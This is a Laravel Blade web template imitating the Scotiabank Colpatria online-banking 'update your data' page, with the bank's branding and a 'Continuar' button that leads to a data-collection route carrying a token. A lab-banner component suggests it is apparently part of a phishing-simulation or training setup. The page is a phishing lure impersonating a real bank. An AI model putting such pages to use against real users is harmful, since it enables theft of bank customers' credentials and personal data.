<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="icon" href="/colpatria/colpatria-favicon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
        rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: Scotia Bold;
            src: url(/colpatria/Scotia_W_Bd.627aff1c32d06c15.woff) format("woff"), url(/colpatria/Scotia_W_Bd.3d89a25acb9e796d.woff2) format("woff2")
        }

        @font-face {
            font-family: Scotia Headline;
            font-style: normal;
            src: url(/colpatria/Scotia_W_Headline.5a532caa3319ee5c.woff) format("woff"), url(/colpatria/Scotia_W_Headline.c0b92ef00c6db65a.woff2) format("woff2")
        }

        @font-face {
            font-family: Scotia Regular;
            font-style: normal;
            src: url(/colpatria/Scotia_W_Rg.a53c6af4aaff8c13.woff) format("woff"), url(/colpatria/Scotia_W_Rg.bb5cf5215aeee399.woff2) format("woff2")
        }

        .boton {
            cursor: pointer;
            margin: 0;
            overflow: visible;
            background-color: #FDC130;
            border-radius: 10rem;
            border: none;
            color: #002C76;
            font-family: "Roboto", "san-serif";
            font-weight: 500;
            height: 4rem;
            outline: none;
            width: 50%;
            font-size: 1rem;
            /* Agregamos estas propiedades para centrar el texto */
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            /* Para quitar el subrayado del enlace */
        }

        .boton-colpa {
            box-sizing: inherit;
            cursor: pointer;
            outline: none;
            overflow: visible;
            position: relative;
            /* font-family: Scotia Bold; */
            font-family: "Roboto", "san-serif";
            font-size: 1.6rem;
            font-weight: bold;
            letter-spacing: 0rem;
            line-height: 1.6rem;
            border: .1rem solid;
            border-radius: .8rem;
            padding: 0 3.6rem;
            text-decoration: none;
            background-color: #ec111a;
            border-color: #ec111a;
            min-height: 4rem;
            min-width: 11.8rem;
            transition: background-color ease-in .1s, color ease-in .1s;
            width: 100%;
        }

        /* Opcional: para el efecto hover */
        .boton:hover {
            color: #002C76;
            /* Mantener el mismo color al hacer hover */
            background-color: #FDC130;
            /* Mantener el mismo fondo al hacer hover */
        }
    </style>
</head>

<body>
<x-lab-banner />
    <div class="container-fluid p-0">
        <!-- Primera imagen -->
        <div class="w-100">
            <img src="/colpatria/colpatria-header.png" alt="" class="img-fluid w-100">
            <img src="/colpatria/colpatria-actualizardatos.png" alt="" class="img-fluid w-100">
        </div>

        <!-- Sección del botón -->
        <div class="boton-colpa d-flex justify-content-center my-3 mx-auto w-75">
            @php
                $tokenParam = $token ?? session('colpatria_token') ?? request()->query('token');
            @endphp
            <a href="{{ route('colpatria.datos') }}{{ $tokenParam ? '?token=' . $tokenParam : '' }}"
                class="btn text-decoration-none d-flex align-items-center justify-content-center text-white fw-bold">
                Continuar
            </a>
        </div>

    </div>
</body>


</html>